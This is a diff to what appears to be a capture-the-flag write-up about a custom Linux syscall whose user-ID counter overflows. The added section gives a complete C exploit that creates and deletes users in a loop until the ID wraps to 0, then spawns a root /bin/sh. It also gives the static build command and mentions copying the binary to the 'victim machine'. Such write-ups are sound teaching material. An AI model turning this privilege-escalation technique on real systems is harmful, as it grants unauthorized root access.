@@ -80,16 +80,38 @@ And the next user is given the `nextId` value, which will be +1 from the previou
 We should note, that in no other function is there something to decrement the `nextId` value, meaning it will always increase.
 Maybe we could just create new users until we overflow the `uid` value to be 0 again?
 Seems possible, cuz `nextId` is an unsigned short (2 bytes), so thats a total of `0xFFFF` values.
-Easily doable.
-However, lets think about what we can accomplish with this.
-So lets say we have the ability to change our ID to be that of any other user.
-What can we do?
-Well, lets say we create another user called `Bob`, and lets give him a UID of 0.
-Then that means both `root` and `Bob` will have a UID of 0.
-However, there is the issue that we need to have the same username as the user we want to edit, and we can't set our username as `root` because that user already exists.
-So we can't edit, at least not as simply as calling the edit feature.
-Also, there is a line in the `switch_user` feature that prevents us switching to root if root is not a child.
-So we can't call that one right away either, (or maybe its possible. i havent looked too deep yet)
-However, we seem to have the ability to delete root.
-So maybe we delete, root, create root, and then edit it?
+Once we obtain that UUID, it would seem that some other values are changed, and then we obtain the privileges of the user with that UUID.
+So if we get UUID 0, then we get the privileges of the root user.
+Here is my exploit.
+After compiling, I gzipped it, then copied it over to the victim machine with base64 encoding.
 
+```c
+#include <sys/syscall.h>
+#include <stdio.h>
+#include <unistd.h>
+
+#define MAGIC_SYS 449
+
+int main() {
+    
+    long uuid = 1;
+    for (int i = 0; i < 0xFFFFFFFF; i++) {
+        // Create the user
+        uuid = syscall(MAGIC_SYS, 0, "bob", "abc123");
+        if (uuid == 0) {
+            syscall(MAGIC_SYS, 3, "bob", "abc123");
+            char *shell = "/bin/sh";
+            char *args[] = {shell, NULL};
+            execve(shell, args, NULL);
+            return 0;
+        }
+        // Delete the user
+        syscall(MAGIC_SYS, 2, "bob", "abc123");
+    }
+    return 0;
+}
+```
+
+```bash
+musl-gcc -static -march=x86-64 -Os expl.c -o expl
+```
